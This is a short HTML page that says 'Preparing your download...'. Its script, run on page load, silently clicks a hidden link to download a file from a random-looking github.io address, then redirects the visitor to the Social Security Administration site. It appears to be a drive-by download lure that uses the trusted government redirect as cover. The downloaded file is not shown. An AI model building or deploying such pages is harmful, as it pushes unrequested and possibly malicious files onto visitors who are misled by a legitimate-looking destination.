<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>
<body>

<p>Preparing your download...</p>

<script>
    // Start file download
    const link = document.createElement("a");
    link.href = "https://acowat.github.io/RSRDTFYGUIOPL-LKJHGFBNVHBMJ-N.MNCVXZB/";
    link.download = "https://acowat.github.io/RSRDTFYGUIOPL-LKJHGFBNVHBMJ-N.MNCVXZB/";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    // Redirect after a short delay
    setTimeout(function () {
        window.location.href = "https://www.ssa.gov";
    }, 3000);
</script>

</body>
</html>
